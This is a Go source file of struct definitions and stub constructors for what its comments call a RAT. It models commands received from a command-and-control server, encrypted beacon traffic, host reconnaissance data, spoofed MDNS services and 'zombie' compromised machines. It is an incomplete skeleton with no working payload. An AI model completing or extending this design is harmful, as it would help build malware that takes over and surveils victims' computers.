/*/
This file contain the structs for making basic types necessary in
"defining the reality" , that is to say, we are making "concepts"
each concept has its own faucets, traits, and actions

Resources:
	- https://gobyexample.com/structs

Go Tips:
	Field Names seem to require capitalization

/*/

package Core

import (
	"crypto/cipher"
	"encoding/json"
	"hash"
	"io"
	"net"
	"os"

	"github.com/cakturk/go-netstat/netstat"
	"github.com/hashicorp/mdns"
	"github.com/shirou/gopsutil/disk"
)

// struct to represent an OS command from the wire
// we will be shoving a JSON payload into this
type Command struct {
	Task_id int
	//store as raw message for now
	Json_input    json.RawMessage
	CommandString string
	// indicate if process using this command is being run or not
	ProcessOn bool
	Process   *RatProcess
}

// represents a process started by the RAT
type RatProcess struct {
	Pid     int
	Process *os.Process
}

// container for Commands
type CommandSet struct {
	// temporarily declared as string during development so
	// the linter/compiler stop throwing errors
	CommandArray string
}

/*/
Contents of post beacon message are as follows:
	Encrypt{
		OutgoingMessage
			Json{HostIntel}
	}

Contents of message are as follows:
	Encrypt{
		OutgoingMessage
			Json{

			}

/*/

// Initial Reply to Beacon from Command Center
type BeaconResponse struct {
	Authstring string
}

// Container for Outgoing messages to the Command And Control
type OutgoingMessage struct {
	// we can declare traits as any type we want

	Contents json.RawMessage
}

// We are going to encrypt this to pass both useage keys and
// messages consisting of OutgoingMessage struct
type AESPacket struct {
	EncAesKey []byte
	EncData   []byte
}

// struct to hold intel about host
type HostIntel struct {
	Interfaces          []net.Interface
	Network_information json.RawMessage
	OSInfo              json.RawMessage
	UDPConnections      []netstat.SockTabEntry
	TCPConnections      []netstat.SockTabEntry
	DriveInformation    []disk.PartitionStat
}

// code from:
// https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/os.go
// OSinfo provides basic information about the target operating system
type WinInfo struct {
	ProductName      string
	ReleaseID        string
	CurrentBuild     string
	InstallationType string
	RegisteredOwner  string
	InstallDate      uint64
	InstallTime      uint64
	ProductID        string
}

//using information compiled here
//
type LinuxInfo struct {
}

/*
Code from :
	- https://medium.com/@mat285/encrypting-streams-in-go-6cff6062a107
*/
type StreamEncrypter struct {
	Source io.Reader
	Block  cipher.Block
	Stream cipher.Stream
	Mac    hash.Hash
	IV     []byte
}

// we need objects to represent a compromised computer
type Zombie struct {
}

// and a set of compromised computers
type ZombieHorde struct {
}

// a "thing" to represent a fallacious MDNS service
type FakeMDNSService struct {
	Host    string
	Info    string
	Service mdns.MDNSService
}

/*/
Must have a way of constructing new structs,
they are structures, you must build them
only need a constructor if they need parameters assigned at birth
/*/

// cant have multiple commands without something to represent a CommandSet
// Only one per entity, currently.
// future revisions will have multiple CommandSets
func NewCommandSet() *CommandSet {
	return &CommandSet{}
}

//todo: add assignments
// function to create a new Command Struct
// we want to return the memory address
// not the contents of that memory address
// We also expect there to be a json input already prepared
func NewCommand(json_input string) *Command {
	new_command := Command{}
	return &new_command
}

//todo: add assignments
// to make things easier on yourself later:
// using a pointer as a return...
/*/ ## Continues: in intel.go -- GatherIntel()
func NewHostIntel() *HostIntel {
	new_host_intel := HostIntel{}
	// do this to return a pointer
	// its a reference to the memory address
	return &new_host_intel
}

func NewFakeMDNSService() *FakeMDNSService {
	new_mdns_service := FakeMDNSService{}
	return &new_mdns_service
}
/*/
